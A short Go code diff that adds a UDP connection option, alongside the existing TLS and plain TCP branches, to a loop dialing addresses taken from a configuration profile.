@@ -118,7 +118,15 @@ func main() {
 			conn net.Conn
 		)
 
-		if profile.UseSSL {
+		if profile.Protocol == "udp" {
+			// UDP connection
+			udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[addrIndex])
+			if err != nil {
+				continue
+			}
+			conn, err = net.DialUDP("udp", nil, udpAddr)
+		} else if profile.UseSSL {
+			// TCP with SSL/TLS
 			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 			if certerr != nil {
 				return
@@ -135,6 +143,7 @@ func main() {
 			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)
 
 		} else {
+			// TCP without SSL
 			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
 		}
 		if err != nil {
